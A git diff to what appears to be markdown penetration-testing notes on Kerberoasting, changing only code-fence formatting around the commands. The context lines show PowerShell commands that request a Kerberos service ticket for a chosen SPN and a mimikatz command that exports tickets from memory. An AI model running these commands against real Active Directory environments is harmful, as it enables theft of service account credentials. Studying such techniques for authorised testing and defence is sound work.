@@ -117,10 +117,10 @@ mimikatz can be used to extract **STs** from memory. But beforehand you will hav
 Having a look at the PowerView section above we are already able to query the desired **SPNs**.  
 Next step is to query for the **ST** which can be done with two lines of powershell:
 
-````
+```powershell
 Add-Type –AssemblyName System.IdentityModel  
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘<SPN-name>:<SPN-port>’
-````
+```
 
 In order to extract the ticket from memory we use mimikatz: 
 ````kerberos::list /export````
